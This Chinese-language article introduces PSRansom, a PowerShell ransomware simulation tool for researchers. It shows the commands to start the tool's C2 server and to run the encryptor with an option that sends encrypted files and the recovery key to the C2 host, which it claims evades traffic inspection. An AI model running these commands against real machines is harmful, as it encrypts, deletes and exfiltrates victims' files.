![](https://image.3001.net/images/20220324/1648136868_623c92a48253af03509f3.png!small)

## 关于PSRansom

PSRansom是一款带有C2服务器功能的PowerShell勒索软件模拟工具，该工具可以帮助广大研究人员模拟针对任何操作系统平台（只要安装了PowerShell即可）的通用勒索软件数据加密过程。在C2服务器功能的帮助下，我们甚至还可以通过HTTP从目标设备（客户端）中提取文件，并在服务器端接收信息。

客户端和服务器端之间的通信数据都经过了加密和编码，因此是无法被基于流量审计的检查工具所检测到的。

## 工具要求

> PowerShell 4.0或更高版本

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/JoelGMSec/PSRansom

或者直接访问该项目的【[
_Releases页面_](https://github.com/JoelGMSec/PSRansom/archive/refs/heads/main.zip)】下载工具的压缩文件。

下载完成之后，我们将拿到两个脚本：PSRansom和C2Server。第一个将模拟勒索软件感染，而第二个将负责恢复文件及其恢复密钥。

## 工具使用

该工具的使用非常简单，我们只需要指明要加密的目录、C2 服务器的 IP 或主机名以及接收连接的端口。

除此之外，如果我们需要发送加密文件，则需要在命令结尾添加-x参数选项即可。在解密的时候，只需要指明目录和恢复密钥即可。

![](https://image.3001.net/images/20220324/1648136899_623c92c3e078a5fac79d6.png!small)

## 工具使用样例

首先，我们的测试场景定义如下：

> 1、勒索软件将在 Windows 机器上运行
>
> 2、我们要加密的文件夹位于 C:\Backup
>
> 3、C2 服务器将在 Kali Linux 上运行
>
> 4、所有流量都将通过代理查看详细信息

接下来，我们看看该工具提供了哪些操作选项：

![](https://image.3001.net/images/20220324/1648136907_623c92cb6cdcf62294811.png!small)

命令和控制服务器的使用也非常简单，我们只需要指明监听连接的端口和接收连接的端口即可。这里，我们使用的是80端口：

    
    
    pwsh C2Server.ps1 + 80

![](https://image.3001.net/images/20220324/1648136921_623c92d995537483e1ba8.png!small)

接下来，我们将使用以下命令运行加密和渗透：

    
    
    .\PSRansom.ps1 -e directory -s ServerC2 -p port -x

![](https://image.3001.net/images/20220324/1648136928_623c92e070aafed508240.png!small)

此时将生成24 个字母数字字符（小写、大写和数字）的随机密钥，数据将以 AES256 加密，并将恢复密钥发送到 C2 服务器。

完成后，原始文件将被删除，仅保留加密的文件：

![](https://image.3001.net/images/20220324/1648136935_623c92e73d80bdc191548.png!small)

服务器端将接收到类似如下图所示的内容：

![](https://image.3001.net/images/20220324/1648136945_623c92f1e2704dfcde9ae.png!small)

现在，我们将在服务器端接收到目标设备的信息、恢复密钥、加密文件列表等：

![](https://image.3001.net/images/20220324/1648137023_623c933f3f9b10812676e.png!small)

## 许可证协议

本项目的开发与发布遵循[ _GPL_
_-3.0_](https://github.com/JoelGMSec/PSRansom/blob/main/LICENSE)开源许可证协议。

## 项目地址

 **PSRansom：** 【[
_GitHub传送门_](%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8PSRansom%E8%BF%9B%E8%A1%8C%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90)】

## 参考资料

> [ _https://darkbyte.net/psransom-simulando-un-ransomware-generico-con-> powershell﻿_](https://darkbyte.net/psransom-simulando-un-ransomware-> generico-con-powershell)

